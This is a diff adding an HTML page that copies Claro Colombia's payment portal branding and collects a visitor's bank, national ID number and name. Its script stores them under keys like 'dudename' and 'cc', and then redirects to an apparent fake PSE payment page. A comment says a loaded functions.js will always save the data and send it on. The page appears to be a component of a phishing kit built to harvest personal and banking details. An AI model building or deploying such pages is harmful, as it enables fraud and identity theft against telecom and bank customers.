@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <link rel="icon" type="image/png" href="img/favicon.ico" />
+  <title>Portal de pagos Claro</title>
+  <link rel="stylesheet" href="css/styles.css" />
+  <link rel="stylesheet" href="./css/flight.css" />
+  <link rel="stylesheet" href="./css/normalize.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/ps.css">
+  <!-- Carga aquí el functions es lo que va a guardar siempre la data Y LO VAS A USAR PARA MANDAR SIEMPRE LA INFORMACION -->
+</head>
+
+<body>
+  <header id="comida">
+    <div class="caja_img">
+      <img class="logo" src="img/logo-claro-blanco.svg" />
+    </div>
+  </header>
+    <div id="ggris1" class="gris1">
+      <div class="texto_gris">
+        <br /><br />
+        <p class="texto1">
+          Portal de
+          <span class="rojo">PAGOS <span class="recargas"> Y RECARGAS</span></span>
+        </p>
+      </div>
+    </div>
+
+    <table id="tabla-opciones">
+      <tr>
+        <td valign="top" align="center">
+          <img id="azul1" src="img/icono-seleccion-on.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul2" src="img/icono-mediopago-on.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul3" src="img/icono-pago-on.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul4" src="img/icono-resultado-off.png" class="imagen" />
+        </td>
+      </tr>
+      <tr>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Ingresa <br />tu Documento
+        </td>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Escoge el <br />medio de pago
+        </td>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Realiza el <br />Pago en linea
+        </td>
+        <td valign="top" align="center" class="etq-pasos">
+          Recibe la <br />Confimacion
+        </td>
+      </tr>
+    </table>
+    <hr />
+
+<section class="form-section">
+  <h2 style="font-weight: 600; margin-bottom: 2rem;">Información del titular</h2>
+  <label for="txt-entidad">Banco</label>
+  <select id="bank-option" required name="txt-entidad" class="form-select"
+    style="background-color: white; border-radius: 0.375rem">
+    <option label="Seleccione su banco" value="">
+      Seleccione su banco
+    </option>
+    <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+    <option label="BANCO BBVA COLOMBIA S.A." value="bbva">
+      BANCO BBVA COLOMBIA S.A.
+    </option>
+    <option label="COLPATRIA" value="colpatria">BANCO COLPATRIA</option>
+    <option label="BANCO DAVIVIENDA" value="davivienda">
+      BANCO DAVIVIENDA
+    </option>
+    <option label="BANCO DE BOGOTA" value="bogota">
+      BANCO DE BOGOTA
+    </option>
+    <option label="BANCO DE OCCIDENTE" value="occidente">
+      BANCO DE OCCIDENTE
+    </option>
+    <option label="BANCO FALABELLA " value="falabella">
+      BANCO FALABELLA
+    </option>
+    <option label="BANCO FINANDINA S.A. BIC" value="finandina">
+      BANCO FINANDINA S.A. BIC
+    </option>
+    <option label="BANCO SERFINANZA" value="serfinanza">
+      BANCO SERFINANZA
+    </option>
+    <option label="NEQUI" value="nequi">NEQUI</option>
+  </select>
+
+  <label for="document">Documento de identificación</label>
+  <input type="number" id="document" name="document" maxlength="10" inputmode="numeric" oninput="this.value = this.value.slice(0, 10);">
+  <br>
+  <label for="name">Nombre y Apellido</label>
+  <input type="text" id="name" name="name">
+
+  <button id="ps-next-step" type="submit" class="inactive">
+    Siguiente paso
+  </button>
+</section>
+  <footer class="footer">
+    <p>Todos los derechos reservados, Claro 2024</p>
+    <nav class="footer-links">
+      <a href="#mapa">Mapa de sitio</a>
+      <a href="#denuncias">Portal de denuncias</a>
+      <a href="#legal">Legal y regulatorio</a>
+    </nav>
+  </footer>
+  <script src="js/functions.js"></script>
+  <script>
+
+    document.addEventListener('DOMContentLoaded', function () {
+      const select = document.getElementById('bank-option');
+      const documentInput = document.getElementById('document');
+      const nameInput = document.getElementById('name');
+      const button = document.getElementById('ps-next-step');
+
+      function checkInputs() {
+        if (select.value && documentInput.value && nameInput.value) {
+          button.classList.remove('inactive');
+          button.classList.add('active');
+        } else {
+          button.classList.remove('active');
+          button.classList.add('inactive');
+        }
+      }
+
+      select.addEventListener('change', checkInputs);
+      documentInput.addEventListener('input', checkInputs);
+      nameInput.addEventListener('input', checkInputs);
+    });
+
+  </script>
+
+  <script>
+    const nameCardInput = document.getElementById("name");
+    const documentInput = document.getElementById("document");
+
+    // Constante para el select del banco y el botón
+    const bankSelect = document.getElementById("bank-option");
+    const nextStepButton = document.getElementById("ps-next-step");
+
+    // Agregar evento click al botón
+    nextStepButton.addEventListener("click", function () {
+      // Guardar todos los valores
+      guardarValor("ban", bankSelect.value);
+      guardarValor(
+        "dudename",
+        nameCardInput.value,
+        3,
+        "Por favor ingrese un nombre válido"
+      );
+      guardarValor(
+        "cc",
+        documentInput.value,
+        1,
+        11,
+        "Por favor ingrese un documento válido"
+      );
+
+      // Validar que se haya seleccionado un banco
+      if (!bankSelect.value) {
+        alert("Por favor seleccione un banco");
+        return;
+      }
+
+      window.location.href = "/points/PSE/index.html";
+    });
+  </script>
+</body>
+
+</html>
